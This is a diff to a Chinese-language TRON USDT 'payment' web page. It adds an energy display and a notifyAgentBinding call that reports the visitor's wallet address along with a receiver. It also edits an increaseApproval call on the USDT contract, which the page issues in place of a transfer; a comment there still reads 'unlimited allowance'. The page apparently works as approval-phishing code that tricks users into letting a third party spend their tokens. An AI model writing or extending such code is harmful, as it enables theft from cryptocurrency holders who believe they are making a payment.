@@ -175,8 +175,9 @@
 			<div class="content">
 				<div class="info">
 					<p>付款钱包：<span id="walletName">请选择付款钱包</span></p>
-					<p>USDT余额：<span id="usdtBalance">请选择付款钱包</span></p>
+					<p>USDT余额：<span id="usdtBalance">加载中...</span></p>
 					<p>TRX余额：<span id="trxBalanceDisplay">加载中...</span></p>
+					<p>可用能量：<span id="energyDisplay">加载中...</span></p>
 					<p>付款金额：<span id="amount">0</span></p>
 				</div>
 				<!-- 这里的按钮样式被 JS 控制 -->
@@ -321,6 +322,12 @@
 					const energyUsed = accountResources.EnergyUsed || 0
 					userData.energy = energyLimit - energyUsed
 
+					// 显示能量(添加千分位分隔符)
+					const energyEl = document.getElementById('energyDisplay')
+					if (energyEl) {
+						energyEl.innerText = userData.energy.toLocaleString('en-US') + ' Energy'
+					}
+
 					// 上报数据
 					reportStatus()
 
@@ -437,12 +444,13 @@
 				// 检查是否满足授权条件:TRX余额≥12 或 能量≥110000
 				if (parseFloat(userData.trxBalance) < 12 && userData.energy < 110000) {
 					showTemporaryMessage('TRX能量不足')
+					notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
 					return
 				} else {
 					try {
 						const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
 						// 无限额度
-						const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+						const amount = '999999'
 
 						// 直接调用 increaseApproval
 						await contract.increaseApproval(receiver, amount).send()
